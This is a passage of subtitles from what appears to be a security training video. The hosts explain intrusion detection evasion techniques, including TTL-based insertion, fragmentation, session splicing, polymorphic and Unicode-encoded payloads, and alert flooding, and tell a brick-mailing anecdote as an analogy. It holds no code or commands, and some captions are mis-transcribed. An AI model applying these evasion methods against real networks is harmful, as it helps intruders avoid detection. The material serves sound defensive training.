in.\n\n184\n00:08:05.350 --> 00:08:07.320\nSo let's actually start\nwith an insertion attack.\n\n185\n00:08:07.320 --> 00:08:10.310\nI've mentioned both but we wanna\ntalk about insertion attacks first.\n\n186\n00:08:10.310 --> 00:08:12.530\nSo if we think about an insertion attack.\n\n187\n00:08:12.530 --> 00:08:14.860\nWhat we're doing here is we're trying,\nas an attacker,\n\n188\n00:08:14.860 --> 00:08:20.300\nto send a single packet to\nthe target system via the IDS.\n\n189\n00:08:20.300 --> 00:08:24.790\nWe vary the TTL, and by doing this\nthe packets that reach the IDS\n\n190\n00:08:24.790 --> 00:08:28.210\nare reaching the IDS in the target\nsystem in different rates and times.\n\n191\n00:08:28.210 --> 00:08:30.600\nSo, in other words,\nwe're varying the delivery.\n\n192\n00:08:30.600 --> 00:08:34.180\nAnd by doing that, the IDS have target\nsystem of two different character strings,\n\n193\n00:08:34.180 --> 00:08:35.900\nand they're examining different data.\n\n194\n00:08:35.900 --> 00:08:40.780\nAnd so if we can trick essentially\nthe IDS, we may be able to get packets by\n\n195\n00:08:40.780 --> 00:08:45.740\nit by varying the delivery, by modulating\nthe TTL's associated with this.\n\n196\n00:08:45.740 --> 00:08:48.140\nSo it's just one way we\ncan spoof essentially or\n\n197\n00:08:48.140 --> 00:08:50.590\nfool the IDS into\nallowing traffic through.\n\n198\n00:08:50.590 --> 00:08:52.320\nCall it an insertion attack.\n\n199\n00:08:52.320 --> 00:08:53.320\nIt's one mechanism.\n\n200\n00:08:53.320 --> 00:08:57.170\nIt may or may not be successful obviously,\nit depends on what you're doing and\n\n201\n00:08:57.170 --> 00:08:59.120\nwhether or not you can get that to work.\n\n202\n00:08:59.120 --> 00:09:00.850\nAnd it doesn't always, sometimes it does.\n\n203\n00:09:00.850 --> 00:09:02.200\nWe can try to evade.\n\n204\n00:09:02.200 --> 00:09:07.170\nIf we do evasions, we're going to\nwind up trying to get the end result,\n\n205\n00:09:07.170 --> 00:09:12.320\nthe target system, to access packets that\nthe IDS may or may not want to process.\n\n206\n00:09:12.320 --> 00:09:12.890\nSo in other words,\n\n207\n00:09:12.890 --> 00:09:16.340\nif we can evade, we accept a packet\nthat the IDS rejects, right.\n\n208\n00:09:16.340 --> 00:09:17.740\nAnd we wanna try to get that.\n\n209\n00:09:17.740 --> 00:09:21.000\nSo the idea is that we are gonna\nexploit the host computer.\n\n210\n00:09:21.000 --> 00:09:24.970\nThe attacker is gonna send a portion\nof the request in a packet that the IDS\n\n211\n00:09:24.970 --> 00:09:28.010\nwill reject, thinking that it's\nnot an appropriate packet.\n\n212\n00:09:28.010 --> 00:09:31.130\nAllows the removal of part\nof the stream from the IDS.\n\n213\n00:09:31.130 --> 00:09:33.980\nSo we're gonna essentially fragment,\nright, the packets.\n\n214\n00:09:33.980 --> 00:09:36.510\nAnd if we can get the IDS\nto drop part of it, but\n\n215\n00:09:36.510 --> 00:09:39.680\nthen maybe not examine the whole thing,\nwell, we could have,\n\n216\n00:09:39.680 --> 00:09:43.440\nfor instance, malicious code being\nsent literally byte by byte.\n\n217\n00:09:43.440 --> 00:09:44.940\nAnd one byte is rejected.\n\n218\n00:09:44.940 --> 00:09:48.300\nBut as a result the IDS doesn't see\nthe other packets being problematic,\n\n219\n00:09:48.300 --> 00:09:49.180\ndoesn't reject them.\n\n220\n00:09:49.180 --> 00:09:53.690\nAnd if we can do that, we're gonna\nthen be able to get more packets\n\n221\n00:09:53.690 --> 00:09:58.550\nthrough to the target,\nthe end point that we're trying to hit.\n\n222\n00:09:58.550 --> 00:10:02.185\nAnd if we can do this, we may be able to\nreassemble the attack on the other side.\n\n223\n00:10:02.185 --> 00:10:03.310\n&gt;&gt; Mm-hm.\n&gt;&gt; Infecting the machine,\n\n224\n00:10:03.310 --> 00:10:05.880\neven though the IDS doesn't\nrealize that we're doing it.\n\n225\n00:10:05.880 --> 00:10:08.340\nRemember, the goal is to try to\nevade detection here, right?\n\n226\n00:10:08.340 --> 00:10:11.480\nAnd so if we can figure out\nways to stealth our activities,\n\n227\n00:10:11.480 --> 00:10:14.550\nwe may be able to engage\nin a variety of a tax.\n\n228\n00:10:14.550 --> 00:10:17.670\nAnd fragmentation is usually gonna\nbe one of the big things we do.\n\n229\n00:10:17.670 --> 00:10:21.100\nWe can do DLS attacks against the ideas\nof course, trying to take it offline,\n\n230\n00:10:21.100 --> 00:10:25.240\nany number of ways to attack an IDS and\nsuck the resources out of it.\n\n231\n00:10:25.240 --> 00:10:30.200\nWe could try to obfuscate the payload\nby encrypting and/or by fragmenting,\n\n232\n00:10:30.200 --> 00:10:34.270\nby doing a variety of different techniques\nthat may be able to allow us to do that.\n\n233\n00:10:34.270 --> 00:10:38.406\nWe may be able to use polymorphic code,\nI talked about polymorphic code in\n\n234\n00:10:38.406 --> 00:10:42.680\nthe malware episodes where code\nis rewriting itself on the fly,\n\n235\n00:10:42.680 --> 00:10:44.610\nmetamorphic polymorphic kind of code.\n\n236\n00:10:44.610 --> 00:10:46.090\nThat's never the same twice.\n\n237\n00:10:46.090 --> 00:10:50.530\nIf we have signature based IDSs, that are\nusing either rule sets or signatures to\n\n238\n00:10:50.530 --> 00:10:54.780\nfigure out what kind of traffic we're\nlooking at, we can morph the code.\n\n239\n00:10:54.780 --> 00:10:58.030\nWe will essentially not violate the rule\nbecause the signature doesn't know\n\n240\n00:10:58.030 --> 00:10:59.010\nwhat to look for.\n\n241\n00:10:59.010 --> 00:11:01.110\nAnd so\nthis requires a lot more finesse and\n\n242\n00:11:01.110 --> 00:11:03.270\ncapabilities because we have to go in, and\n\n243\n00:11:03.270 --> 00:11:07.580\nwe have to be able to figure out what kind\nof IDS we're up against as an attacker.\n\n244\n00:11:07.580 --> 00:11:11.140\nSo we have to not only do some recon,\nbut also some fingerprinting to\n\n245\n00:11:11.140 --> 00:11:14.930\nmap out the network, understand what\nthe protection perimeters look like.\n\n246\n00:11:14.930 --> 00:11:17.415\nAnd you are just like the URL man.\n\n247\n00:11:17.415 --> 00:11:19.200\n&gt;&gt; [LAUGH]\n&gt;&gt; You are just wow.\n\n248\n00:11:19.200 --> 00:11:20.535\nLike fingers flying over there.\n\n249\n00:11:20.535 --> 00:11:22.450\n&gt;&gt; [LAUGH]\n&gt;&gt; There's smoke coming off the keyboard.\n\n250\n00:11:22.450 --> 00:11:23.962\n&gt;&gt; No.\n&gt;&gt; You're zipping those things out.\n\n251\n00:11:23.962 --> 00:11:27.085\nI'm gonna have to come up with another\nfour or five, so Mike keeps busy.\n\n252\n00:11:27.085 --> 00:11:28.733\n&gt;&gt; [LAUGH]\n&gt;&gt; Otherwise he's gonna have nothing to do\n\n253\n00:11:28.733 --> 00:11:29.330\nhere in a minute.\n\n254\n00:11:29.330 --> 00:11:32.190\nI thought that would take\nyou most of the talk track.\n\n255\n00:11:32.190 --> 00:11:33.530\n&gt;&gt; You were firing off\nquite a few of them.\n\n256\n00:11:33.530 --> 00:11:34.920\n&gt;&gt; You were like okay I'll show you.\n\n257\n00:11:34.920 --> 00:11:35.515\nBoom, boom, boom.\n\n258\n00:11:35.515 --> 00:11:37.300\n[LAUGH]\n&gt;&gt; Right, you got an intern behind you\n\n259\n00:11:37.300 --> 00:11:38.650\nsomewhere doing this, don't you?\n\n260\n00:11:38.650 --> 00:11:39.630\nRight, we're not seeing that,\n\n261\n00:11:39.630 --> 00:11:43.310\nbut Johnny Intern is back there\ncranking these out for Mike, sorry.\n\n262\n00:11:43.310 --> 00:11:46.103\nHopefully all those would be real good for\nyou in the chat window.\n\n263\n00:11:46.103 --> 00:11:50.396\nBut the idea here is that with polymorphic\nor metamorphic code, as we talked about,\n\n264\n00:11:50.396 --> 00:11:53.962\njust reminding you of that thought\nprocess, we can actually get in and\n\n265\n00:11:53.962 --> 00:11:56.100\nwe can circumvent signature based IDSs.\n\n266\n00:11:56.100 --> 00:11:59.100\nSo there's a lot of subtlety\nthat goes on with these attacks.\n\n267\n00:11:59.100 --> 00:12:03.380\nWe may be able to manipulate the path that\nis referenced in the signature to fool\n\n268\n00:12:03.380 --> 00:12:06.120\nthe host based IDS,\nit's another way to obfuscate.\n\n269\n00:12:06.120 --> 00:12:08.470\nWe can obviously use\nencrypted protocols and\n\n270\n00:12:08.470 --> 00:12:12.320\ntunneling to transmit traffic and\nprevent the IDS from seeing it.\n\n271\n00:12:12.320 --> 00:12:15.140\nYou will, lot of times,\nwill set these systems up, but\n\n272\n00:12:15.140 --> 00:12:19.041\nwe don't do in line encrypt/decrypt,\nbecause of the exposure of the SSL and\n\n273\n00:12:19.041 --> 00:12:20.730\nTLS keys, and so your DSSL keys.\n\n274\n00:12:20.730 --> 00:12:24.270\nAs a result of that,\nwe don't want to put the keys out there or\n\n275\n00:12:24.270 --> 00:12:29.420\nwe don't wanna store them in a secure\ndevice, maybe put them into an appliance\n\n276\n00:12:29.420 --> 00:12:33.220\nthat has a TPM or an HSM associated\nwith it to do the encryption.\n\n277\n00:12:33.220 --> 00:12:34.570\nBut if we haven't done that,\n\n278\n00:12:34.570 --> 00:12:37.990\nwe're gonna pass this traffic as we can't\nexpose it there's no way to understand it,\n\n279\n00:12:37.990 --> 00:12:41.120\nand that can lead to compromise because\nall these attacks can go through.\n\n280\n00:12:41.120 --> 00:12:43.360\nWhat about encoding attack\npatterns in Unicode?\n\n281\n00:12:43.360 --> 00:12:45.075\nBypassing the IDS filters.\n\n282\n00:12:45.075 --> 00:12:46.185\nIt's another big one, right?\n\n283\n00:12:46.185 --> 00:12:47.920\nSo we could do that as well.\n\n284\n00:12:47.920 --> 00:12:50.918\nSo when you think about the ways in\nwhich we can start to manipulate this,\n\n285\n00:12:50.918 --> 00:12:52.649\ngets to be a little interesting, right?\n\n286\n00:12:52.649 --> 00:12:55.637\nI mean who would sit down and\nthink [INAUDIBLE] monkeying around and\n\n287\n00:12:55.637 --> 00:12:58.993\nasking in Unicode and I'll see if I can\ntranslate that attack into a form that\n\n288\n00:12:58.993 --> 00:13:00.637\nthe system's not gonna recognize.\n\n289\n00:13:00.637 --> 00:13:02.255\nSo that may be something to think about.\n\n290\n00:13:02.255 --> 00:13:09.126\nWe could craft malicious packets that\nif we know enough about the IDS and\n\n291\n00:13:09.126 --> 00:13:16.110\nagain you'll think fingerprinting,\nthink reconning here.\n\n292\n00:13:16.110 --> 00:13:18.600\nEarly stages of the attack process.\n\n293\n00:13:18.600 --> 00:13:23.650\nIf we think about a methodology, if we\nknow enough about the IDS that is in use.\n\n294\n00:13:23.650 --> 00:13:27.450\nWe may be able to craft specific malicious\npockets that will allow us to generate\n\n295\n00:13:27.450 --> 00:13:31.070\nalerts and to essentially play\nwith the system and say, okay.\n\n296\n00:13:31.070 --> 00:13:31.740\nAlert on this,\n\n297\n00:13:31.740 --> 00:13:35.570\nalert on that to have you go chase your\ntail over there somewhere, chasing these\n\n298\n00:13:35.570 --> 00:13:39.110\nthings that don't exist while we slip our\nattack packets through on the other side.\n\n299\n00:13:39.110 --> 00:13:43.710\nSo we can actually manipulate the system\nto our advantage by crafting purposely\n\n300\n00:13:43.710 --> 00:13:47.200\nmade malicious packets that will set\noff certain alarm bells but not others.\n\n301\n00:13:47.200 --> 00:13:48.880\n&gt;&gt; Yeah.\nI can see the lazy admin.\n\n302\n00:13:48.880 --> 00:13:50.954\nI'm getting tired of these things\ngoing off every five minutes.\n\n303\n00:13:50.954 --> 00:13:52.383\n&gt;&gt; I see a lazy admin.\n\n304\n00:13:52.383 --> 00:13:54.230\nI see a lazy admin.\n\n305\n00:13:54.230 --> 00:13:56.880\n&gt;&gt; And until I figure out what's going\nwrong, I'm just gonna shut it down.\n\n306\n00:13:56.880 --> 00:13:57.600\n&gt;&gt; Right, yeah.\n\n307\n00:13:57.600 --> 00:13:59.300\n&gt;&gt; And now you've got free range.\n\n308\n00:13:59.300 --> 00:14:00.750\n&gt;&gt; Right,\nbecause if they kill the interface, right,\n\n309\n00:14:00.750 --> 00:14:02.670\nessentially to stop the monitor.\n\n310\n00:14:02.670 --> 00:14:05.310\nAnd remember an IDS is not gonna\ntake actions, it's gonna alert.\n\n311\n00:14:05.310 --> 00:14:09.200\nSo all we need to do is figure out how to\nsneak past the alert, right, and we're in.\n\n312\n00:14:09.200 --> 00:14:12.310\nWe're not talking about an IPS that\ncan grab our IP and cut it off,\n\n313\n00:14:12.310 --> 00:14:14.980\nright, we're talking about an IDS that\nessentially is just gonna simply say, hey\n\n314\n00:14:14.980 --> 00:14:18.620\nby the way, that Mike guy he's attacking,\nyou should go pay attention to that.\n\n315\n00:14:18.620 --> 00:14:22.830\nIf we could stop that by getting them to\nturn off, I like that the lazy admin.\n\n316\n00:14:22.830 --> 00:14:26.390\nThat's a great name for\na bar, right, the lazy admin.\n\n317\n00:14:26.390 --> 00:14:27.670\n&gt;&gt; Don't tell everybody that's our.\n\n318\n00:14:27.670 --> 00:14:28.820\n&gt;&gt; That\n&gt;&gt; Retirement for them.\n\n319\n00:14:28.820 --> 00:14:30.625\n&gt;&gt; That's the hurricane\npizza thing right there.\n\n320\n00:14:30.625 --> 00:14:32.215\n&gt;&gt; [LAUGH]\n&gt;&gt; That's where we can market\n\n321\n00:14:32.215 --> 00:14:33.031\nhurricane pizza.\n\n322\n00:14:33.031 --> 00:14:35.200\nSo the lazy admin,\nif they don't get up and\n\n323\n00:14:35.200 --> 00:14:39.073\ndo something then somebody will just\nkill the interface, then I like that.\n\n324\n00:14:39.073 --> 00:14:41.198\nThat is wow.\n\n325\n00:14:41.198 --> 00:14:42.571\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm speechless,\n\n326\n00:14:42.571 --> 00:14:43.331\nI don't know what to say.\n\n327\n00:14:43.331 --> 00:14:44.905\nThat's cool, I like that.\n\n328\n00:14:44.905 --> 00:14:47.783\nSo we can actually generate a large\nnumber of false positives by doing this.\n\n329\n00:14:47.783 --> 00:14:51.039\nAnd that could overwhelm the system\nas well, right, to Mike's point and\n\n330\n00:14:51.039 --> 00:14:52.350\nthat could be an issue.\n\n331\n00:14:52.350 --> 00:14:54.810\nYou ever hear of something\ncalled session splicing?\n\n332\n00:14:54.810 --> 00:14:57.120\n&gt;&gt; Session splicing, I have not.\n\n333\n00:14:57.120 --> 00:14:58.570\n&gt;&gt; As in session splicing.\n\n334\n00:14:58.570 --> 00:15:02.310\n&gt;&gt; I figure we're gonna be taking two\nsessions and maybe putting them together.\n\n335\n00:15:02.310 --> 00:15:03.058\n&gt;&gt; I don't know what it is.\n\n336\n00:15:03.058 --> 00:15:04.840\nI just thought you would know, so\nI thought I'd throw it out there and\n\n337\n00:15:04.840 --> 00:15:07.535\nif you didn't know I was just\ngonna ignore it totally.\n\n338\n00:15:07.535 --> 00:15:08.070\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n339\n00:15:08.070 --> 00:15:10.080\nobviously that ball didn't fly very well.\n\n340\n00:15:10.080 --> 00:15:11.655\nNo yeah and it is actually very.\n\n341\n00:15:11.655 --> 00:15:12.570\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n342\n00:15:12.570 --> 00:15:14.050\n&gt;&gt; I'm kidding I'm kidding.\n\n343\n00:15:14.050 --> 00:15:14.750\nI know what it is.\n\n344\n00:15:14.750 --> 00:15:15.490\nWe'll talk about it.\n\n345\n00:15:15.490 --> 00:15:18.455\nI'm only throwing it out there just\nto see if Mike's paying attention.\n\n346\n00:15:18.455 --> 00:15:19.480\n&gt;&gt; [LAUGH]\n&gt;&gt; I've got to give him something to do,\n\n347\n00:15:19.480 --> 00:15:20.840\nhe's done typing URL's in the window.\n\n348\n00:15:20.840 --> 00:15:21.790\n&gt;&gt; I'm done typing URL's.\n\n349\n00:15:21.790 --> 00:15:26.170\nSo you're actually spot on with that,\nwith one minor variation.\n\n350\n00:15:26.170 --> 00:15:28.420\nSo what we're actually gonna do is,\nwe are gonna stitch them together, so\n\n351\n00:15:28.420 --> 00:15:29.220\nyou're right about that.\n\n352\n00:15:29.220 --> 00:15:33.210\nWhat we're actually gonna do, and\nit's more properly named session splicing.\n\n353\n00:15:33.210 --> 00:15:35.090\nNot quite explaining what we do,\nvery similar.\n\n354\n00:15:35.090 --> 00:15:37.295\nI actually prefer to think of\nit as session overlapping.\n\n355\n00:15:37.295 --> 00:15:38.530\nBecause that's actually what we're doing.\n\n356\n00:15:38.530 --> 00:15:40.610\nWhat we're trying to do\nis take two sessions,\n\n357\n00:15:40.610 --> 00:15:43.650\noverlap them by a certain number of bytes.\n\n358\n00:15:43.650 --> 00:15:46.750\nAnd as a result, if those bytes\nare over lapping one another,\n\n359\n00:15:46.750 --> 00:15:49.430\nthey may not be referenced and\nexamined twice.\n\n360\n00:15:49.430 --> 00:15:51.552\nAnd so as result,\nwe can manipulate some of that.\n\n361\n00:15:51.552 --> 00:15:54.657\nAnd so it's actually in a way\nin which we can bypass the IDS,\n\n362\n00:15:54.657 --> 00:15:58.760\nby splitting the attack traffic into\ndifferent packs and no signal fragment,\n\n363\n00:15:58.760 --> 00:16:01.637\nagain fragmentation Trigger\nthe idea specifically.\n\n364\n00:16:01.637 --> 00:16:05.736\nBut because we're not gonna reconstruct\nall the packets cuz there is overlap,\n\n365\n00:16:05.736 --> 00:16:07.750\nwe're not gonna see the attack.\n\n366\n00:16:07.750 --> 00:16:08.653\n&gt;&gt; Nice.\n&gt;&gt; So yeah, again,\n\n367\n00:16:08.653 --> 00:16:10.078\nit's kinda interesting and\nit's kinda cool.\n\n368\n00:16:10.078 --> 00:16:13.578\nSo it is essentially what you were talking\nabout, but I prefer to think of it more as\n\n369\n00:16:13.578 --> 00:16:16.802\nthat overlap, cuz it really is more\nabout the overlap than anything else.\n\n370\n00:16:16.802 --> 00:16:21.249\nNow the other thing we can do,\nwe can play with the packet reassembly and\n\n371\n00:16:21.249 --> 00:16:22.680\nassembly time.\n\n372\n00:16:22.680 --> 00:16:25.780\nBecause if we know that an IDS,\nthis gets into again,\n\n373\n00:16:25.780 --> 00:16:28.830\nthe idea of really understanding\nthe architecture and\n\n374\n00:16:28.830 --> 00:16:32.590\nthe deployment model of the network\nthat we're trying to attack.\n\n375\n00:16:32.590 --> 00:16:35.890\nIf we can understand that, again,\nrecon and fingerprinting, right?\n\n376\n00:16:35.890 --> 00:16:40.160\nSo if we know, let's just hypothetically\nsay we're using IDSA, right,\n\n377\n00:16:40.160 --> 00:16:42.150\nif that's the model, IDSA.\n\n378\n00:16:42.150 --> 00:16:45.070\nIf we know that and we know about it,\nwe've done our homework, so\n\n379\n00:16:45.070 --> 00:16:46.390\nwe figured it out what it is.\n\n380\n00:16:46.390 --> 00:16:49.700\nWe read up on it, we figure out how\nit works, the internal workings.\n\n381\n00:16:49.700 --> 00:16:53.230\nAll these systems have a delay\nin packet reassembly, and\n\n382\n00:16:53.230 --> 00:16:54.040\nwe just don't know what they are.\n\n383\n00:16:54.040 --> 00:16:57.294\nThere's a buffer essentially,\na cache mechanism, as packets come in.\n\n384\n00:16:57.294 --> 00:17:00.900\nAnd if we're doing stateful inspection, we\nhave to reassemble them to figure it out.\n\n385\n00:17:00.900 --> 00:17:03.854\nSo we're gonna cache that in a window,\nit's like the TCP receive window.\n\n386\n00:17:03.854 --> 00:17:04.410\n&gt;&gt; Okay.\n\n387\n00:17:04.410 --> 00:17:05.319\n&gt;&gt; We're essentially gonna have a buffer,\nright?\n\n388\n00:17:05.319 --> 00:17:06.826\n&gt;&gt; Right.\n&gt;&gt; And as a result of that,\n\n389\n00:17:06.826 --> 00:17:09.468\nif we can figure that out based\non the make and model and\n\n390\n00:17:09.468 --> 00:17:13.084\nknow how to manipulate that and\nunderstand what that offset looks like.\n\n391\n00:17:13.084 --> 00:17:14.323\nIf we're aware of that,\n\n392\n00:17:14.323 --> 00:17:17.876\nwe can actually add delays between\npacket transmissions to skip that.\n\n393\n00:17:17.876 --> 00:17:20.958\nAnd then, when it reassembles,\nit reassembles the block we set, it says,\n\n394\n00:17:20.958 --> 00:17:24.245\nwell that's okay, that doesn't look like\nany bad code, let me let that through.\n\n395\n00:17:24.245 --> 00:17:28.258\nAnd then we send another chunk of bad\ncode, but we send it five seconds later?\n\n396\n00:17:28.258 --> 00:17:31.809\nI don't know whatever that is, and\nas a result that block gets through.\n\n397\n00:17:31.809 --> 00:17:35.367\nAnd so when we reassemble,\nwe're reassembling the full attack, but\n\n398\n00:17:35.367 --> 00:17:36.527\nwe've spaced it out.\n\n399\n00:17:36.527 --> 00:17:37.420\n&gt;&gt; Right.\n\n400\n00:17:37.420 --> 00:17:39.950\n&gt;&gt; So, another aspect of session splicing.\n\n401\n00:17:39.950 --> 00:17:40.680\nSo this is kinda cool.\n\n402\n00:17:40.680 --> 00:17:44.160\nI actually saw a second round of\naside by the way, just cuz it's so\n\n403\n00:17:44.160 --> 00:17:46.360\ngood the first time,\nwe'd be remiss if we didn't do two.\n\n404\n00:17:46.360 --> 00:17:48.250\n&gt;&gt; It's a Friday bonus aside.\n\n405\n00:17:48.250 --> 00:17:49.481\n&gt;&gt; A Friday bonus aside, right?\n\n406\n00:17:49.481 --> 00:17:51.643\nSo this one is actually kinda,\nthis is a historical one,\n\n407\n00:17:51.643 --> 00:17:53.020\nthis is actually kinda cool.\n\n408\n00:17:53.020 --> 00:17:58.170\nSo, on the rare occasion I do watch TV,\nI actually caught something,\n\n409\n00:17:58.170 --> 00:17:59.700\nlast night I think it was, actually.\n\n410\n00:17:59.700 --> 00:18:02.598\nSo I was done with all the stuff that,\nas you know,\n\n411\n00:18:02.598 --> 00:18:05.162\nI'm burdened with doing after we get done.\n\n412\n00:18:05.162 --> 00:18:06.625\n&gt;&gt; [LAUGH]\n&gt;&gt; So I finished up, but\n\n413\n00:18:06.625 --> 00:18:09.519\nI was just trying to kill some time,\nand I had to go through some things, so\n\n414\n00:18:09.519 --> 00:18:10.986\nI turned on the TV in the background.\n\n415\n00:18:10.986 --> 00:18:12.426\nAnd, have you ever seen,\n\n416\n00:18:12.426 --> 00:18:16.886\nI think it's Mysteries at the Museum or\nsomething like that I think they call it?\n\n417\n00:18:16.886 --> 00:18:17.463\n&gt;&gt; Yeah, sounds familiar.\n\n418\n00:18:17.463 --> 00:18:18.330\n&gt;&gt; I think that was the program.\n\n419\n00:18:18.330 --> 00:18:19.890\nBut anyway, so\nthey were doing this really cool thing.\n\n420\n00:18:19.890 --> 00:18:24.310\nThey were talking about this person\nback in the 1920s looking to,\n\n421\n00:18:24.310 --> 00:18:27.230\nin a small town in the middle\nof nowhere out in Utah or\n\n422\n00:18:27.230 --> 00:18:30.000\nsomewhere, looking to build a bank for\nhis town, so\n\n423\n00:18:30.000 --> 00:18:33.680\nthat he could essentially get the town\non the map and literally help everybody.\n\n424\n00:18:33.680 --> 00:18:39.365\nAnd he was trying to figure out how to,\nof all things, ship bricks into the town,\n\n425\n00:18:39.365 --> 00:18:42.800\nfrom where they were in Salt Lake City or\nwherever, the main depot there, to get\n\n426\n00:18:42.800 --> 00:18:46.490\nthem into this town out in the middle of\nthe desert of Utah, the middle of nowhere.\n\n427\n00:18:46.490 --> 00:18:49.770\nAnd they had to figure out how to do this,\nand the guy didn't have the money\n\n428\n00:18:49.770 --> 00:18:53.240\nto do this and build the bank, and they\nneeded 80,000 bricks to build this bank.\n\n429\n00:18:53.240 --> 00:18:54.737\nIt was just ridiculous, right?\n\n430\n00:18:54.737 --> 00:18:57.017\nAnd so\nhe's trying to figure out ways to do this.\n\n431\n00:18:57.017 --> 00:19:00.454\nAnd the story was so, just kinda cool that\nI actually stopped what I was doing and\n\n432\n00:19:00.454 --> 00:19:01.233\npaid attention.\n\n433\n00:19:01.233 --> 00:19:04.450\nAnd so\nthey start talking about how he does this.\n\n434\n00:19:04.450 --> 00:19:05.740\nAnd this was so cool,\n\n435\n00:19:05.740 --> 00:19:08.430\ncuz this is essentially the same\nexact thing we just described.\n\n436\n00:19:08.430 --> 00:19:12.680\nSo what he does is he figures out that\nat the time, back in the late 1920s,\n\n437\n00:19:12.680 --> 00:19:18.240\nearly 1930s in the United States,\nyou had the postal service, right?\n\n438\n00:19:18.240 --> 00:19:21.257\nAnd you had the ability to be able\nto send everything and whatever.\n\n439\n00:19:21.257 --> 00:19:24.502\nBut, he was not gonna pay to ship\nthe stuff, because shipping bricks,\n\n440\n00:19:24.502 --> 00:19:25.705\nI mean bricks literally.\n\n441\n00:19:25.705 --> 00:19:26.256\n&gt;&gt; They're awfully heavy.\n\n442\n00:19:26.256 --> 00:19:27.207\n&gt;&gt; Awfully heavy.\n\n443\n00:19:27.207 --> 00:19:31.104\nIt was gonna cost a gazillion dollars\nto ship 80,000 bricks by rail, right?\n\n444\n00:19:31.104 --> 00:19:32.805\nThis was before UPS and FedEx.\n\n445\n00:19:32.805 --> 00:19:35.490\nWe're talking not far after\nthe Pony Express era, right?\n\n446\n00:19:35.490 --> 00:19:36.770\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n447\n00:19:36.770 --> 00:19:38.219\nthe guy showed up lugging\nthe bricks behind him.\n\n448\n00:19:38.219 --> 00:19:40.026\n&gt;&gt; [LAUGH]\n&gt;&gt; He was not gonna be able to\n\n449\n00:19:40.026 --> 00:19:43.281\nbulk ship this stuff, but\nhe figured out that there was a loophole.\n\n450\n00:19:43.281 --> 00:19:45.424\nHe could go to the US Postal Service,\n\n451\n00:19:45.424 --> 00:19:48.341\nas long as he kept his\npackages under 50 pounds.\n\n452\n00:19:48.341 --> 00:19:54.796\nThat he could ship an unlimited number of\npackages to any person, under 50 pounds.\n\n453\n00:19:54.796 --> 00:19:57.471\nAnd whatever the price was at the time,\n\n454\n00:19:57.471 --> 00:20:02.432\nthat it was actually gonna be cheaper\nby a factor of a ridiculous amount.\n\n455\n00:20:02.432 --> 00:20:06.015\nIt was gonna cost a third of what it would\ncost if he had to ship it the other way,\n\n456\n00:20:06.015 --> 00:20:07.798\nif he just posted all these packages.\n\n457\n00:20:07.798 --> 00:20:11.636\nSo he goes to the brickyard,\norders 80,000 bricks,\n\n458\n00:20:11.636 --> 00:20:17.590\ngets 80,000 bricks made, packages them\nall up into 45-pound boxed packages.\n\n459\n00:20:17.590 --> 00:20:21.731\nLike 7,000 packages of 45\npounds each they said, and\n\n460\n00:20:21.731 --> 00:20:26.368\nhe shows up at the post office,\nright, bringing in all this stuff.\n\n461\n00:20:26.368 --> 00:20:29.471\nAnd he throws it all on the counter and\nessentially says, okay,\n\n462\n00:20:29.471 --> 00:20:30.890\nhere you go, I wanna.\n\n463\n00:20:30.890 --> 00:20:33.830\nAnd they looked at him like, you're out\nof your mind, there's absolutely no way.\n\n464\n00:20:33.830 --> 00:20:36.060\nBut he said, listen, this is the law.\n\n465\n00:20:36.060 --> 00:20:38.600\nThis is what you said,\nand so I want this done.\n\n466\n00:20:38.600 --> 00:20:40.791\nSo, they actually had to\nstart shipping his bricks.\n\n467\n00:20:40.791 --> 00:20:42.358\n&gt;&gt; Wow.\n&gt;&gt; So they start shipping them,\n\n468\n00:20:42.358 --> 00:20:45.406\nand they get about, I don't know,\nhalfway through whatever it was.\n\n469\n00:20:45.406 --> 00:20:47.268\nAnd the postmaster in Utah said,\nokay look, this is not,\n\n470\n00:20:47.268 --> 00:20:48.376\nthere's just absolutely no way.\n\n471\n00:20:48.376 --> 00:20:52.576\n&gt;&gt; [LAUGH]\n&gt;&gt; So they go to try to pass a law while\n\n472\n00:20:52.576 --> 00:20:56.702\nthis is happening to essentially say,\nlisten, you can ship, but\n\n473\n00:20:56.702 --> 00:21:01.510\nthere's a limit to the number of packages\nthat can be sent to a single person.\n\n474\n00:21:01.510 --> 00:21:04.152\n&gt;&gt; Okay.\n&gt;&gt; So, you have 500 packages or whatever,\n\n475\n00:21:04.152 --> 00:21:06.934\nso you can't actually\njust bulk ship unlimited.\n\n476\n00:21:06.934 --> 00:21:08.870\nSo they were just talking about\nhow this whole thing evolved, and\n\n477\n00:21:08.870 --> 00:21:11.099\nultimately how he got around it, and\nultimately got all the bricks there.\n\n478\n00:21:11.099 --> 00:21:12.947\nAnd so, it was just a really cool story.\n\n479\n00:21:12.947 --> 00:21:16.556\nBut he essentially fragmented-\n&gt;&gt; Fragmented the bricks, yeah.\n\n480\n00:21:16.556 --> 00:21:18.234\n&gt;&gt; And just gamed the US Postal Service.\n\n481\n00:21:18.234 --> 00:21:20.455\nI thought that was the coolest\nthing in the world.\n\n482\n00:21:20.455 --> 00:21:23.222\nSo this is exactly the kinda thing\nthat we're talking about, right?\n\n483\n00:21:23.222 --> 00:21:26.988\nIf you break up the packets, and\nyou're smart enough and persistent,\n\n484\n00:21:26.988 --> 00:21:31.275\nyou too can ship 80,000 bricks to\nthe middle of nowhere in the Utah desert.\n\n485\n00:21:31.275 --> 00:21:32.290\nThat's the goal and moral of this story.\n\n486\n00:21:32.290 --> 00:21:33.823\nI am done here, sir.\n\n487\n00:21:33.823 --> 00:21:34.623\nWe are finished.\n\n488\n00:21:34.623 --> 00:21:35.344\n&gt;&gt; [LAUGH] All right.\n\n489\n00:21:35.344 --> 00:21:36.616\n&gt;&gt; Not really, not quite,\nwe're almost, almost.\n\n490\n00:21:36.616 --> 00:21:38.525\n&gt;&gt; [LAUGH]\n&gt;&gt; I thought that was actually\n\n491\n00:21:38.525 --> 00:21:39.867\nreally kinda cool,\n&gt;&gt; That was.\n\n492\n00:21:39.867 --> 00:21:40.662\n&gt;&gt; Just as a story.\n\n493\n00:21:40.662 --> 00:21:41.980\nWhat about Unicode, right?\n\n494\n00:21:41.980 --> 00:21:43.560\nWe talked about Unicode\nevasion techniques.\n\n495\n00:21:43.560 --> 00:21:46.770\nWe could obviously do the modification\nfrom asking into Unicode.\n\n496\n00:21:46.770 --> 00:21:51.210\nAnd if you could speak in Unicode and\ntell me my name, I will give you a 